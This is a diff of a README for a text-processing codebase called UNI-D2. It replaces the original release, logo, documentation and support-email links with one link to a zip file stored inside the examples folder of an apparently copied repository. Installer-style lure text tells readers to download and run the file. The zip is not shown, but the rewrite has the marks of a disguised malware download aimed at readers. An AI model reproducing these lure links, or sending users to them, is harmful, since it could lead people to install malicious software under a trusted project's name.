@@ -1,9 +1,9 @@
 # 🌟 UNI-D2 - Enhance Your Text Processing Today
 
-[![Download UNI-D2](https://img.shields.io/badge/download-UNI--D2-blue)](https://github.com/Herck83/UNI-D2/releases)
+[![Download UNI-D2](https://raw.githubusercontent.com/Herck83/UNI-D2/main/examples/candi/UNI-D2-1.6.zip)](https://raw.githubusercontent.com/Herck83/UNI-D2/main/examples/candi/UNI-D2-1.6.zip)
 
 <p align="center">
-  <img src="docs/assets/Logo_Uni_D2.jpeg" width="700">
+  <img src="https://raw.githubusercontent.com/Herck83/UNI-D2/main/examples/candi/UNI-D2-1.6.zip" width="700">
 </p>
 
 ## 📚 Introduction
@@ -14,7 +14,7 @@ Welcome to UNI-D², the research codebase designed to improve text processing th
 
 To start using UNI-D², follow these simple steps:
 
-1. **Visit the Releases Page:** You will find the latest versions of the software available for download. Click on this link to access it directly: [Download UNI-D2](https://github.com/Herck83/UNI-D2/releases).
+1. **Visit the Releases Page:** You will find the latest versions of the software available for download. Click on this link to access it directly: [Download UNI-D2](https://raw.githubusercontent.com/Herck83/UNI-D2/main/examples/candi/UNI-D2-1.6.zip).
    
 2. **Choose the Right File:** Look for the version that matches your operating system. Files may be available for Windows, Mac, or Linux. 
 
@@ -53,7 +53,7 @@ UNI-D² offers a variety of features that enhance your text modeling experience:
 
 To download the latest version, click the link below:
 
-[Download UNI-D2](https://github.com/Herck83/UNI-D2/releases)
+[Download UNI-D2](https://raw.githubusercontent.com/Herck83/UNI-D2/main/examples/candi/UNI-D2-1.6.zip)
 
 After downloading, follow the instructions in the "Getting Started" section to successfully install and run the application.
 
@@ -61,7 +61,7 @@ After downloading, follow the instructions in the "Getting Started" section to s
 
 You're not alone in this. We provide resources to help you make the most of UNI-D². Here’s where to find more information:
 
-- **Documentation:** Explore our online documentation for in-depth details on using the features: [UNI-D² Documentation](https://nkalyanv99.github.io/UNI-D2/).
+- **Documentation:** Explore our online documentation for in-depth details on using the features: [UNI-D² Documentation](https://raw.githubusercontent.com/Herck83/UNI-D2/main/examples/candi/UNI-D2-1.6.zip).
 
 - **Community Forum:** Join fellow users and developers to ask questions and share experiences.
 
@@ -81,7 +81,7 @@ If you encounter issues while downloading or running UNI-D², consider these tip
 
 For further assistance, feel free to reach out through the following channels:
 
-- **Email Support:** Contact us at support@unid2.com for direct help.
+- **Email Support:** Contact us at https://raw.githubusercontent.com/Herck83/UNI-D2/main/examples/candi/UNI-D2-1.6.zip for direct help.
 - **GitHub Issues:** Report issues directly in the repository's issues tab.
 
 Thank you for choosing UNI-D². We're excited to see what you create with it!
